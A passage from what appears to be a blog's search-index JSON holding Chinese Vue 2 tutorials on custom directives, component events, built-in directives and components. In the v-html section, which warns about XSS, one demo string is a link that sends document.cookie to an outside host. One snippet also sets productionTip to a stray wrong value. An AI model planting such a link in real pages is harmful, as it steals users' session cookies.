指令所在的模板被重新解析时        update(element, binding) &#123;          element.value = binding.value        &#125;      &#125;    &#125;  &#125;)&lt;/script&gt;\n\n\n\ndirectives\n\n定义语法\n\n局部指令\nnew Vue(&#123;\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t  directives:&#123;     指令名:配置对象   &#125;   &#125;)new Vue(&#123;\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t  directives:&#123;     指令名:回调函数   &#125;   &#125;)\n\n全局指令\nVue.directive(指令名, 配置对象)或Vue.directive(指令名, 回调函数)\nVue.directive(&#x27;fbind&#x27;, &#123;    // 指令与元素成功绑定时（一上来）    bind(element, binding) &#123;\t// element就是DOM元素，binding就是要绑定的      element.value = binding.value    &#125;,    // 指令所在元素被插入页面时    inserted(element, binding) &#123;      element.focus()    &#125;,    // 指令所在的模板被重新解析时    update(element, binding) &#123;      element.value = binding.value    &#125;&#125;)\n\n\nbind、inserted、update称为钩子，在vue3已被修复\n\n配置对象中常用的3个回调函数\n\nbind(element, binding) 指令与元素成功绑定时调用\n\ninserted(element, binding)指令所在元素被插入页面时调用\n\nupdate(element, binding) 指令所在模板结构被重新解析时调用\n\n\nelement就是DOM元素，binding就是要绑定的对象，它包含以下属性：name value old Value expression arg modifiers\n备注\n\n指令定义时不加v-，但使用时要加v-\n\n指令名如果是多个单词，要使用kebab-case命名方式，不要用camelCase命名\nnew Vue(&#123;\tel: &#x27;#root&#x27;,\tdata: &#123;\t\tn:1\t&#125;,\tdirectives: &#123;\t\t&#x27;big-number&#x27;(element,binding) &#123;\t\t\telement.innerText = binding.value * 10\t\t&#125;\t&#125;&#125;)\n\n\n\n\n\n","categories":["Vue"],"tags":["自定义指令"]},{"title":"Vue（十九）：Vue脚手架之组件的自定义事件","url":"/2022/04/08/Vue%EF%BC%88%E5%8D%81%E4%B9%9D%EF%BC%89%EF%BC%9AVue%E8%84%9A%E6%89%8B%E6%9E%B6%E4%B9%8B%E7%BB%84%E4%BB%B6%E7%9A%84%E8%87%AA%E5%AE%9A%E4%B9%89%E4%BA%8B%E4%BB%B6/","content":"组件的自定义事件\n一种组件间通信的方式，适用于：子组件 &#x3D;&#x3D;&#x3D;&gt; 父组件\n\n使用场景\nA是父组件，B是子组件，子组件想给父组件传数据，那么就要在父组件中给子组件绑定自定义事件（事件的回调在A中)\n\n绑定自定义事件\n\n第一种方式，在父组件中&lt;Demo @事件名=&quot;回调函数&quot;/&gt;或&lt;Demo v-on:事件名=&quot;回调函数&quot;/&gt;\n\n第二种方式，在父组件中,示例如下：\n&lt;Demo @atguigu=&quot;test&quot; ref=&quot;demo&quot;/&gt;......mounted()&#123;   this.$refs.demo.$on(&#x27;atguigu&#x27;,this.test)&#125;\n\n若想让自定义事件只能触发一次，可以使用once修饰符，或$once方法\n\n\n\n触发自定义事件\n在子组件中this.$emit(&#39;事件名&#39;,数据)\n\n解绑自定义事件\n在子组件中this.$off(&#39;事件名&#39;)\n\n组件上也可以绑定原生 DOM事件，需要使用native修饰符，例如@click.native=&quot;show&quot;\n上面绑定自定义事件，即使绑定的是原生事件也会被认为是自定义的，需要加native，加了后就将此事件给组件的根元素\n\n注意:\n通过this.$refs.demo.$on(&#39;事件名&#39;,回调函数)绑定自定义事件时，回调函数要么配置在methods中，要么用箭头函数，否则this指向会出问题\n\n\n使用自定义事件优化Todo-Listsrc/App.vue\n&lt;template&gt;\t&lt;div id=&quot;root&quot;&gt;\t\t&lt;div class=&quot;todo-container&quot;&gt;\t\t\t&lt;div class=&quot;todo-wrap&quot;&gt;\t\t\t\t&lt;MyHeader @addTodo=&quot;addTodo&quot;/&gt;\t\t\t\t&lt;MyList :todos=&quot;todos&quot; :checkTodo=&quot;checkTodo&quot; :deleteTodo=&quot;deleteTodo&quot;/&gt;\t\t\t\t&lt;MyFooter :todos=&quot;todos&quot;                   @checkAllTodo=&quot;checkAllTodo&quot; @clearAllTodo=&quot;clearAllTodo&quot;/&gt;\t\t\t&lt;/div&gt;\t\t&lt;/div&gt;\t&lt;/div&gt;&lt;/template&gt;&lt;script&gt;\timport MyHeader from &#x27;./components/MyHeader&#x27;\timport MyList from &#x27;./components/MyList&#x27;\timport MyFooter from &#x27;./components/MyFooter.vue&#x27;\texport default &#123;\t\tname:&#x27;App&#x27;,\t\tcomponents:&#123;MyHeader,MyList,MyFooter&#125;,\t\tdata() &#123;\t\t\treturn &#123;\t\t\t\t//由于todos是MyHeader组件和MyFooter组件都在使用，所以放在App中（状态提升）\t\t\t\ttodos:JSON.parse(localStorage.getItem(&#x27;todos&#x27;)) || []\t\t\t&#125;\t\t&#125;,\t\tmethods: &#123;\t\t\t//添加一个todo\t\t\taddTodo(todoObj)&#123;\t\t\t\tthis.todos.unshift(todoObj)\t\t\t&#125;,\t\t\t//勾选or取消勾选一个todo\t\t\tcheckTodo(id)&#123;\t\t\t\tthis.todos.forEach((todo)=&gt;&#123;\t\t\t\t\tif(todo.id === id) todo.done = !todo.done\t\t\t\t&#125;)\t\t\t&#125;,\t\t\t//删除一个todo\t\t\tdeleteTodo(id)&#123;\t\t\t\tthis.todos = this.todos.filter( todo =&gt; todo.id !== id )\t\t\t&#125;,\t\t\t//全选or取消全选\t\t\tcheckAllTodo(done)&#123;\t\t\t\tthis.todos.forEach((todo)=&gt;&#123;\t\t\t\t\ttodo.done = done\t\t\t\t&#125;)\t\t\t&#125;,\t\t\t//清除所有已经完成的todo\t\t\tclearAllTodo()&#123;\t\t\t\tthis.todos = this.todos.filter((todo)=&gt;&#123;\t\t\t\t\treturn !todo.done\t\t\t\t&#125;)\t\t\t&#125;\t\t&#125;,\t\twatch: &#123;\t\t\ttodos:&#123;\t\t\t\tdeep:true,\t\t\t\thandler(value)&#123;\t\t\t\t\tlocalStorage.setItem(&#x27;todos&#x27;,JSON.stringify(value))\t\t\t\t&#125;\t\t\t&#125;\t\t&#125;,\t&#125;&lt;/script&gt;\n\nsrc/components/MyHeader.vue\n&lt;template&gt;\t&lt;div class=&quot;todo-header&quot;&gt;\t\t&lt;input type=&quot;text&quot; placeholder=&quot;请输入你的任务名称，按回车键确认&quot;            v-model=&quot;title&quot; @keyup.enter=&quot;add&quot;/&gt;\t&lt;/div&gt;&lt;/template&gt;&lt;script&gt;\timport &#123;nanoid&#125; from &#x27;nanoid&#x27;\texport default &#123;\t\tname:&#x27;MyHeader&#x27;,\t\tdata() &#123;\t\t\treturn &#123;\t\t\t\ttitle:&#x27;&#x27;\t// 收集用户输入的title\t\t\t&#125;\t\t&#125;,\t\tmethods: &#123;\t\t\tadd()&#123;\t\t\t\t//校验数据\t\t\t\tif(!this.title.trim()) return alert(&#x27;输入不能为空&#x27;)\t\t\t\t//将用户的输入包装成一个todo对象\t\t\t\tconst todoObj = &#123;id:nanoid(),title:this.title,done:false&#125;\t\t\t\t//通知App组件去添加一个todo对象\t\t\t\tthis.$emit(&#x27;addTodo&#x27;,todoObj)\t\t\t\t//清空输入\t\t\t\tthis.title = &#x27;&#x27;\t\t\t&#125;\t\t&#125;,\t&#125;&lt;/script&gt;\n\nsrc/components/MyFooter.vue\n&lt;template&gt;\t&lt;div class=&quot;todo-footer&quot; v-show=&quot;total&quot;&gt;\t\t&lt;label&gt;\t\t\t&lt;!-- &lt;input type=&quot;checkbox&quot; :checked=&quot;isAll&quot; @change=&quot;checkAll&quot;/&gt; --&gt;\t\t\t&lt;input type=&quot;checkbox&quot; v-model=&quot;isAll&quot;/&gt;\t\t&lt;/label&gt;\t\t&lt;span&gt;\t\t\t&lt;span&gt;已完成&#123;&#123; doneTotal &#125;&#125;&lt;/span&gt; / 全部&#123;&#123; total &#125;&#125;\t\t&lt;/span&gt;\t\t&lt;button class=&quot;btn btn-danger&quot; @click=&quot;clearAll&quot;&gt;清除已完成任务&lt;/button&gt;\t&lt;/div&gt;&lt;/template&gt;&lt;script&gt;\texport default &#123;\t\tname:&#x27;MyFooter&#x27;,\t\tprops:[&#x27;todos&#x27;],\t\tcomputed: &#123;\t\t\t//总数\t\t\ttotal()&#123;\t\t\t\treturn this.todos.length\t\t\t&#125;,\t\t\t//已完成数\t\t\tdoneTotal()&#123;\t\t\t\treturn this.todos.reduce((pre,todo)=&gt; pre + (todo.done ? 1 : 0) ,0)\t\t\t&#125;,\t\t\t//控制全选框\t\t\tisAll:&#123;\t\t\t\t//全选框是否勾选\t\t\t\tget()&#123;\t\t\t\t\treturn this.doneTotal === this.total &amp;&amp; this.total &gt; 0\t\t\t\t&#125;,\t\t\t\t//isAll被修改时set被调用\t\t\t\tset(value)&#123;\t\t\t\t\t// this.checkAllTodo(value)\t\t\t\t\tthis.$emit(&#x27;checkAllTodo&#x27;,value)\t\t\t\t&#125;\t\t\t&#125;\t\t&#125;,\t\tmethods: &#123;\t\t\t//清空所有已完成\t\t\tclearAll()&#123;\t\t\t\t// this.clearAllTodo()\t\t\t\tthis.$emit(&#x27;clearAllTodo&#x27;)\t\t\t&#125;\t\t&#125;,\t&#125;&lt;/script&gt;\n\n","categories":["Vue"],"tags":["Vue CLI","组件通信","自定义事件"]},{"title":"Vue（十二）：常用内置指令","url":"/2022/04/06/Vue%EF%BC%88%E5%8D%81%E4%BA%8C%EF%BC%89%EF%BC%9A%E5%B8%B8%E7%94%A8%E5%86%85%E7%BD%AE%E6%8C%87%E4%BB%A4/","content":"之前学过的指令\nv-bind 单向绑定解析表达式，可简写为:\nv-model 双向数据绑定\nv-for 遍历数组 &#x2F; 对象 &#x2F; 字符串\nv-on 绑定事件监听，可简写为@\nv-show 条件渲染 (动态控制节点是否展示)\nv-if 条件渲染（动态控制节点是否存存在）\nv-else-if 条件渲染（动态控制节点是否存存在）\nv-else 条件渲染（动态控制节点是否存存在）\n\nv-text\n作用：向其所在的节点中渲染文本内容\n\n与插值语法的区别：v-text会替换掉节点中的所有内容，&#123;&#123;xxx&#125;&#125;则不会，更灵活，更多情况下用插值语法\n&lt;title&gt;v-text指令&lt;/title&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;&lt;div id=&quot;root&quot;&gt;  &lt;div&gt;你好，&#123;&#123;name&#125;&#125;&lt;/div&gt;  &lt;div v-text=&quot;name&quot;&gt;&lt;/div&gt;  &lt;div v-text=&quot;str&quot;&gt;&lt;/div&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot;&gt;  Vue.config.productionTip = false  new Vue(&#123;    el:&#x27;#root&#x27;,    data:&#123;      name:&#x27;cess&#x27;,      str:&#x27;&lt;h3&gt;你好啊！&lt;/h3&gt;&#x27;    &#125;  &#125;)&lt;/script&gt;\n\n\n\n\nv-html\n作用：向指定节点中渲染包含html结构的内容\n与插值语法的区别：\nv-html会替换掉节点中所有的内容，&#123;&#123;xxx&#125;&#125;则不会\nv-html可以识别html结构\n\n\n严重注意v-html有安全性问题！！！\n在网站上动态渲染任意html是非常危险的，容易导致 XSS 攻击\n一定要在可信的内容上使用v-html，永远不要用在用户提交的内容上！！！\n\n\n\n&lt;title&gt;v-html指令&lt;/title&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;&lt;div id=&quot;root&quot;&gt;  &lt;div&gt;你好，&#123;&#123; name &#125;&#125;&lt;/div&gt;  &lt;div v-html=&quot;str&quot;&gt;&lt;/div&gt;  &lt;div v-html=&quot;str2&quot;&gt;&lt;/div&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot;&gt;  Vue.config.productionTip = FontFaceSetLoadEvent  new Vue(&#123;    el:&#x27;#root&#x27;,    data:&#123;      name:&#x27;cess&#x27;,      str:&#x27;&lt;h3&gt;你好啊！&lt;/h3&gt;&#x27;,      str2:&#x27;&lt;a href=javascript:location.href=&quot;http://www.baidu.com?&quot;+document.cookie&gt;兄弟我找到你想要的资源了，快来！&lt;/a&gt;&#x27;,    &#125;  &#125;)&lt;/script&gt;\n\n\nv-cloak\nv-cloak指令（没有值）\n本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性\n使用css配合v-cloak可以解决网速慢时页面展示出的问题\n\n\n\n&lt;title&gt;v-cloak指令&lt;/title&gt;&lt;style&gt;  [v-cloak] &#123;    display:none;  &#125;&lt;/style&gt;&lt;div id=&quot;root&quot;&gt;  &lt;h2 v-cloak&gt;&#123;&#123; name &#125;&#125;&lt;/h2&gt;&lt;/div&gt;// 够延迟5秒收到vue.js&lt;script type=&quot;text/javascript&quot; src=&quot;http://localhost:8080/resource/5s/vue.js&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot;&gt;  console.log(1)  Vue.config.productionTip = false  new Vue(&#123;    el:&#x27;#root&#x27;,    data:&#123;name:&#x27;cess&#x27;&#125;  &#125;)&lt;/script&gt;\n\nv-once\nv-once指令（没有值）\nv-once所在节点在初次动态渲染后，就视为静态内容了\n以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能\n\n\n\n&lt;title&gt;v-once指令&lt;/title&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;&lt;div id=&quot;root&quot;&gt;  &lt;h2 v-once&gt;初始化的n值是: &#123;&#123;n&#125;&#125;&lt;/h2&gt;  &lt;h2&gt;当前的n值是: &#123;&#123;n&#125;&#125;&lt;/h2&gt;  &lt;button @click=&quot;n++&quot;&gt;点我n+1&lt;/button&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot;&gt;  Vue.config.productionTip = false  new Vue(&#123; el: &#x27;#root&#x27;, data: &#123;n:1&#125; &#125;)&lt;/script&gt;\n\n\nv-pre\n跳过v-pre所在节点的编译过程\n可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译\n\n&lt;title&gt;v-pre指令&lt;/title&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;&lt;div id=&quot;root&quot;&gt;  &lt;h2 v-pre&gt;Vue其实很简单&lt;/h2&gt;  &lt;h2 &gt;当前的n值是:&#123;&#123;n&#125;&#125;&lt;/h2&gt;  &lt;button @click=&quot;n++&quot;&gt;点我n+1&lt;/button&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot;&gt;  Vue.config.productionTip = false  new Vue(&#123; el:&#x27;#root&#x27;, data:&#123;n:1&#125; &#125;)&lt;/script&gt;\n\n\n","categories":["Vue"],"tags":["内置指令"]},{"title":"Vue（十五）：组件化编程","url":"/2022/04/07/Vue%EF%BC%88%E5%8D%81%E4%BA%94%EF%BC%89%EF%BC%9A%E7%BB%84%E4%BB%B6%E5%8C%96%E7%BC%96%E7%A8%8B/","content":"模块与组件、模块化与组件化\n\n\n模块\n理解：向外提供特定功能的 js 程序，一般就是一个 js 文件\n为什么：js 文件很多很复杂\n作用：复用、简化 js 的编写，提高 js 运行效率\n\n\n组件\n定义：用来实现局部（特定）功能的代码和资源的集合（html&#x2F;css&#x2F;js&#x2F;image…）\n为什么：一个界面的功能很复杂\n作用：复用编码，简化项目编码，提高运行效率\n\n\n模块化\n当应用中的 js 都以模块来编写的，那这个应用就是一个模块化的应用\n\n\n组件化\n当应用中的功能都是多组件的方式来编写的，那这个应用就是一个组件化的应用\n\n\n\n非单文件组件\n非单文件组件：一个文件(a.html)中包含有 n 个组件\n单文件组件：一个文件(a.vue)中只包含有 1 个组件\n\n基本使用Vue中使用组件的三大步骤\n定义组件\n使用Vue.extend(options)创建，其中options（配置项）和new Vue(options)时传入的options几乎一样，但也有点区别\n\nel不要写，因为最终所有的组件都要经过一个vm的管理，由vm中的el才决定服务哪个容器\n\ndata必须写成函数，避免组件被复用时，数据存在引用关系\n\n\n备注：使用template可以配置组件结构\n\n\n注册组件\n局部注册：new Vue()的时候options传入components选项\n\n全局注册：Vue.component(&#39;组件名&#39;,组件)\n\n\n使用组件\n编写组件标签，如 \n\n&lt;title&gt;基本使用&lt;/title&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;&lt;div id=&quot;root&quot;&gt;  &lt;h2&gt;&#123;&#123;msg&#125;&#125;&lt;/h2&gt;&lt;hr&gt;  &lt;!-- 第三步：编写组件标签 --&gt;  &lt;school&gt;&lt;/school&gt;&lt;hr&gt;  &lt;student&gt;&lt;/student&gt;&lt;hr&gt;  &lt;hello&gt;&lt;/hello&gt;&lt;hr&gt;&lt;/div&gt;&lt;div id=&quot;root2&quot;&gt;  &lt;hello&gt;&lt;/hello&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot;&gt;  Vue.config.productionTip = false  //第一步：创建school组件  const school = Vue.extend(&#123;    // el:&#x27;#root&#x27;, //组件定义时，一定不要写el配置项，    // 因为最终所有的组件都要被一个vm管理，由vm决定服务于哪个容器    template: `\t\t\t\t&lt;div class=&quot;demo&quot;&gt;\t\t\t\t\t&lt;h3&gt;学校名称：&#123;&#123;schoolName&#125;&#125;&lt;/h3&gt;\t\t\t\t\t&lt;h3&gt;学校地址：&#123;&#123;address&#125;&#125;&lt;/h3&gt;\t\t\t\t\t&lt;button @click=&quot;showName&quot;&gt;点我提示学校名&lt;/button&gt;\t  \t\t\t&lt;/div&gt;\t\t\t`,    data() &#123;      return &#123;        schoolName: &#x27;尚硅谷&#x27;,        address: &#x27;北京昌平&#x27;      &#125;    &#125;,    methods: &#123;      showName() &#123;        alert(this.schoolName)      &#125;    &#125;,  &#125;)  //第一步：创建student组件  const student = Vue.extend(&#123;    template: `\t\t\t\t&lt;div&gt;\t\t\t\t\t&lt;h3&gt;学生姓名：&#123;&#123;studentName&#125;&#125;&lt;/h3&gt;\t\t\t\t\t&lt;h3&gt;学生年龄：&#123;&#123;age&#125;&#125;&lt;/h3&gt;  \t\t\t&lt;/div&gt;\t\t\t`,    data() &#123;      return &#123;        studentName: &#x27;张三&#x27;,        age: 18      &#125;    &#125;  &#125;)  //第一步：创建hello组件  const hello = Vue.extend(&#123;    template: `\t\t\t\t&lt;div&gt;\t\t\t\t\t\t&lt;h3&gt;你好啊！&#123;&#123;name&#125;&#125;&lt;/h3&gt;  \t\t\t&lt;/div&gt;\t\t\t`,    data() &#123;      return &#123;        name: &#x27;cess&#x27;      &#125;    &#125;  &#125;)  //第二步：全局注册组件  Vue.component(&#x27;hello&#x27;, hello)  //创建vm  new Vue(&#123;    el: &#x27;#root&#x27;,    data: &#123;      msg: &#x27;你好啊！&#x27;    &#125;,    //第二步：注册组件（局部注册）    components: &#123;      school,      student    &#125;  &#125;)  new Vue(&#123;    el: &#x27;#root2&#x27;,  &#125;)&lt;/script&gt;\n\n\n组件注意事项关于组件名\n一个单词组成\n\n第一种写法（首字母小写）：school\n\n第二种写法（首字母大写）：School\n\n\n\n多个单词组成\n\n第一种写法（kebab-case 命名）：my-school\n\n第二种写法（CamelCase 命名）：MySchool（需要Vue脚手架支持）\n\n\n\n备注\n\n组件名尽可能回避HTML中已有的元素名称，例如：h2、H2都不行\n可以使用name配置项指定组件在开发者工具中呈现的名字（可用于使用第三方组件库时起一个别名）\n\n\n\n关于组件标签\n第一种写法：&lt;school&gt;&lt;/school&gt;\n第二种写法：&lt;school/&gt;（需要Vue脚手架支持）\n备注：不使用脚手架时，会导致后续组件不能渲染\n\n一个简写方式：const school = Vue.extend(options)可简写为const school = options，因为父组件components引入的时候会自动创建\n&lt;title&gt;几个注意点&lt;/title&gt;\t&lt;script type=&quot;text/javascript&quot; src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;\t&lt;div id=&quot;root&quot;&gt;\t\t&lt;h2&gt;&#123;&#123;msg&#125;&#125;&lt;/h2&gt;\t\t&lt;school&gt;&lt;/school&gt;\t&lt;/div&gt;&lt;script type=&quot;text/javascript&quot;&gt;\tVue.config.productionTip = false\t//定义组件\tconst school = Vue.extend(&#123;\t\tname: &#x27;atguigu&#x27;, // 组件给自己起个名字，用于在浏览器开发工具上显示\t\ttemplate: `\t\t\t\t&lt;div&gt;\t\t\t\t\t&lt;h3&gt;学校名称：&#123;&#123;name&#125;&#125;&lt;/h3&gt;\t\t\t\t\t\t&lt;h3&gt;学校地址：&#123;&#123;address&#125;&#125;&lt;/h3&gt;\t\t\t\t\t&lt;/div&gt;\t\t\t`,\t\tdata() &#123;\t\t\treturn &#123;\t\t\t\tname: &#x27;电子科技大学&#x27;,\t\t\t\taddress: &#x27;成都&#x27;\t\t\t&#125;\t\t&#125;\t&#125;)\tnew Vue(&#123;\t\tel: &#x27;#root&#x27;,\t\tdata: &#123;\t\t\tmsg: &#x27;欢迎学习Vue!&#x27;\t\t&#125;,\t\tcomponents: &#123;\t\t\tschool\t\t&#125;\t&#125;)&lt;/script&gt;\n\n\n组件的嵌套\n&lt;title&gt;组件的嵌套&lt;/title&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;&lt;div id=&quot;root&quot;&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot;&gt;  Vue.config.productionTip = false  //定义student组件  const student = Vue.extend(&#123;    name: &#x27;student&#x27;,    template: `\t\t\t\t&lt;div&gt;\t\t\t\t\t&lt;h4&gt;学生姓名：&#123;&#123;name&#125;&#125;&lt;/h4&gt;\t\t\t\t\t\t&lt;h4&gt;学生年龄：&#123;&#123;age&#125;&#125;&lt;/h4&gt;\t  \t\t\t&lt;/div&gt;\t\t\t`,    data() &#123;return &#123;name: &#x27;尚硅谷&#x27;,age: 18&#125;&#125;  &#125;)  //定义school组件  const school = Vue.extend(&#123;    name: &#x27;school&#x27;,    template: `\t\t\t\t&lt;div&gt;\t\t\t\t\t&lt;h3&gt;学校名称：&#123;&#123;name&#125;&#125;&lt;/h3&gt;\t\t\t\t\t\t&lt;h3&gt;学校地址：&#123;&#123;address&#125;&#125;&lt;/h3&gt;\t\t\t\t\t\t&lt;student&gt;&lt;/student&gt; \t\t\t  &lt;/div&gt;\t\t\t`,    data() &#123;return &#123;name: &#x27;尚硅谷&#x27;,address: &#x27;北京&#x27;&#125;&#125;,    //注册组件（局部）    components: &#123; student &#125;  &#125;)  //定义hello组件  const hello = Vue.extend(&#123;    template: `&lt;h3&gt;&#123;&#123;msg&#125;&#125;&lt;/h3&gt;`,    data() &#123;return &#123;msg: &#x27;欢迎来到尚硅谷学习！&#x27;&#125;&#125;  &#125;)  //定义app组件  const app = Vue.extend(&#123;    template: `\t\t\t\t&lt;div&gt;\t\t\t\t\t\t&lt;hello&gt;&lt;/hello&gt;\t\t\t\t\t&lt;school&gt;&lt;/school&gt;  \t\t\t&lt;/div&gt;\t\t\t`,    components: &#123; school, hello &#125;  &#125;)  //创建vm  new Vue(&#123;    el: &#x27;#root&#x27;,    template: &#x27;&lt;app&gt;&lt;/app&gt;&#x27;,    //注册组件（局部）    components: &#123; app &#125;  &#125;)&lt;/script&gt;\n\n\nVueComponent关于 VueComponent\n\nschool 组件本质是一个名为VueComponent的构造函数，且不是程序员定义的，而是 Vue.extend() 生成的\n\n我们只需要写 &lt;school/&gt; 或 &lt;school&gt;&lt;/school&gt;，Vue 解析时会帮我们创建 school 组件的实例对象，即Vue帮我们执行的new VueComponent(options)\n\n特别注意：每次调用Vue.extend，返回的都是一个全新的VueComponent，即不同组件是不同的对象\n\n关于 this 指向\n\n组件配置中data函数、methods中的函数、watch中的函数、computed中的函数 它们的 this 均是 VueComponent实例对象（vc）\nnew Vue(options)配置中：data函数、methods中的函数、watch中的函数、computed中的函数 它们的 this 均是 Vue实例对象（vm）\n\n\nVueComponent的实例对象，以后简称vc（组件实例对象）\nVue的实例对象，以后简称vm\n\n\n&lt;title&gt;VueComponent&lt;/title&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;&lt;div id=&quot;root&quot;&gt;  &lt;school&gt;&lt;/school&gt;  &lt;hello&gt;&lt;/hello&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot;&gt;  Vue.config.productionTip = false  // 定义school组件  const school = Vue.extend(&#123;    name: &#x27;school&#x27;,    template: `\t\t\t\t&lt;div&gt;\t\t\t\t\t&lt;h2&gt;学校名称：&#123;&#123;name&#125;&#125;&lt;/h2&gt;\t\t\t\t\t\t&lt;h2&gt;学校地址：&#123;&#123;address&#125;&#125;&lt;/h2&gt;\t\t\t\t\t\t&lt;button @click=&quot;showName&quot;&gt;点我提示学校名&lt;/button&gt;  \t\t\t&lt;/div&gt;\t\t\t`,    data() &#123;return &#123;name: &#x27;尚硅谷&#x27;,address: &#x27;北京&#x27;&#125;&#125;,    methods: &#123;showName() &#123;console.log(&#x27;showName&#x27;, this)&#125;&#125;,  &#125;)  const test = Vue.extend(&#123;    template: `&lt;span&gt;atguigu&lt;/span&gt;`  &#125;)  // 定义hello组件  const hello = Vue.extend(&#123;    template: `\t\t\t\t&lt;div&gt;\t\t\t\t\t&lt;h2&gt;&#123;&#123;msg&#125;&#125;&lt;/h2&gt;\t\t\t\t\t&lt;test&gt;&lt;/test&gt;\t  \t\t\t&lt;/div&gt;\t\t\t`,    data() &#123;return &#123;msg: &#x27;你好啊！&#x27;&#125;&#125;,    components: &#123; test &#125;  &#125;)  // console.log(&#x27;@&#x27;,school)  // console.log(&#x27;#&#x27;,hello)  // 创建vm  const vm = new Vue(&#123;    el: &#x27;#root&#x27;,    components: &#123; school, hello &#125;  &#125;)&lt;/script&gt;\n\n一个重要的内置关系\n\n一个重要的内置关系：VueComponent.prototype.proto &#x3D;&#x3D;&#x3D; Vue.prototype\n\n为什么要有这个关系：让组件实例对象vc可以访问到 Vue原型上的属性、方法\n\n\n单文件组件\nSchool.vue\n&lt;template&gt;    &lt;div id=&#x27;Demo&#x27;&gt;        &lt;h2&gt;学校名称：&#123;&#123;name&#125;&#125;&lt;/h2&gt;        &lt;h2&gt;学校地址：&#123;&#123;address&#125;&#125;&lt;/h2&gt;        &lt;button @click=&quot;showName&quot;&gt;点我提示学校名&lt;/button&gt;    &lt;/div&gt;&lt;/template&gt;&lt;script&gt;    export default &#123;        name:&#x27;School&#x27;,        data() &#123;            return &#123;                name:&#x27;UESTC&#x27;,                address:&#x27;成都&#x27;            &#125;        &#125;,        methods: &#123;            showName()&#123;                alert(this.name)            &#125;        &#125;,    &#125;&lt;/script&gt;&lt;style&gt;    #Demo&#123;        background: orange;    &#125;&lt;/style&gt;\n\nStudent.vue\n&lt;template&gt;    &lt;div&gt;        &lt;h2&gt;学生姓名：&#123;&#123;name&#125;&#125;&lt;/h2&gt;        &lt;h2&gt;学生年龄：&#123;&#123;age&#125;&#125;&lt;/h2&gt;    &lt;/div&gt;&lt;/template&gt;&lt;script&gt;    export default &#123;        name:&#x27;Student&#x27;,        data() &#123;            return &#123;                name:&#x27;cess&#x27;,                age:20            &#125;        &#125;,    &#125;&lt;/script&gt;\n\nApp.vue\n&lt;template&gt;    &lt;div&gt;        &lt;School&gt;&lt;/School&gt;        &lt;Student&gt;&lt;/Student&gt;    &lt;/div&gt;&lt;/template&gt;&lt;script&gt;    import School from &#x27;./School.vue&#x27;    import Student from &#x27;./Student.vue&#x27;    export default &#123;        name:&#x27;App&#x27;,        components:&#123;            School,            Student        &#125;    &#125;&lt;/script&gt;\n\nmain.js\nimport App from &#x27;./App.vue&#x27;new Vue(&#123;    template:`&lt;App&gt;&lt;/App&gt;`,    el:&#x27;#root&#x27;,    components:&#123;App&#125;&#125;)\n\nindex.html\n&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;单文件组件练习&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;div id=&quot;root&quot;&gt;&lt;/div&gt;    &lt;script src=&quot;../../js/vue.js&quot;&gt;&lt;/script&gt;    &lt;script src=&quot;./main.js&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\n\n","categories":["Vue"],"tags":["组件"]},{"title":"Vue（十八）：Vue脚手架之Todo-List案例","url":"/2022/04/08/Vue%EF%BC%88%E5%8D%81%E5%85%AB%EF%BC%89%EF%BC%9AVue%E8%84%9A%E6%89%8B%E6%9E%B6%E4%B9%8BTodo-List%E6%A1%88%E4%BE%8B/","content":"组件化编码流程\n拆分静态组件：组件要按照功能点拆分，命名不要与html元素冲突\n实现动态组件：考虑好数据的存放位置，数据是一个组件在用，还是一些组件再用\n一个组件在用：放在组件自身即可\n一些组件在用：放在他们共同的父组件上**(状态提升)**\n\n\n实现交互：从绑定事件开始\n\nprops适用于\n\n父组件 &#x3D;&#x3D;&gt; 子组件通信\n\n子组件 &#x3D;&#x3D;&gt; 父组件通信（要求父组件先给子组件一个函数)\n\n注意：\n\n使用v-model时要切记：v-model 绑定的值不能是props传过来的值，因为props是不可以修改的\n\nprops传过来的若是对象类型的值，修改对象中的属性时Vue不会报错，但不推荐这样做\n\n\n\n代码：\nsrc/App.vue\n&lt;template&gt;  &lt;div id=&quot;root&quot;&gt;    &lt;div class=&quot;todo-container&quot;&gt;      &lt;div class=&quot;todo-wrap&quot;&gt;        &lt;MyHeader :addTodo=&quot;addTodo&quot;/&gt;        &lt;MyList :todos=&quot;todos&quot; :checkTodo=&quot;checkTodo&quot; :deleteTodo=&quot;deleteTodo&quot;/&gt;        &lt;MyFooter :todos=&quot;todos&quot;                   :checkAllTodo=&quot;checkAllTodo&quot; :clearAllTodo=&quot;clearAllTodo&quot;/&gt;    \t&lt;/div&gt;    &lt;/div&gt;  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;  import MyHeader from &#x27;./components/MyHeader&#x27;  import MyList 